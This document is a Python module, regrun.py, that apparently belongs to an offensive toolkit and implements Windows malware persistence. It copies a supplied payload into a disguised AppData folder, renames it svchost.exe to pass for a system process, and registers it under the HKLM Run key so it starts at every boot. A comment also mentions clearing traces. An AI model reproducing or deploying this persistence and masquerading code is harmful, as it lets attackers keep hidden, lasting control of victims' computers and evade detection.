"""
regrun.py: Windows-specific persistence method for adding a run key to the Windows registry.
"""

import os
import sys
import shutil
import logging

if sys.platform == "win32":
    import winreg
else:
    winreg = None


class RUNKEY:

    def __init__(self, payload: str):
        self.payload      = payload
        self.current_user = os.getlogin()


    def _add_run_key(self, file: str):
        """
        Add a run key to the Windows registry.
        """
        key_path   = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "svchost"

        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, file)

            logging.info(f"Run key added successfully: {file}")
        except Exception as e:
            logging.error(f"Error adding run key: {e}")


    def _copy_and_rename(self, source_path: str, destination_path: str, new_filename: str):
        """
        Copy and rename a file.
        """
        try:
            os.makedirs(destination_path, exist_ok=True) # Make sure dst folder exists!

            # Copy and rename file (--nuke / -n option will clear traces)
            new_file_path = os.path.join(destination_path, new_filename)
            shutil.copy(source_path, new_file_path)

            return new_file_path
        except Exception as e:
            logging.error(f"Error copying and renaming file: {e}")
            return None


    def install(self):
        """
        Install payload.
        """
        dst           = "C:\\Users\\" + self.current_user + "\\AppData\\Roaming\\WindowsExtensions\\"
        new_file_path = self._copy_and_rename(self.payload, dst, "svchost.exe")

        self._add_run_key(new_file_path)
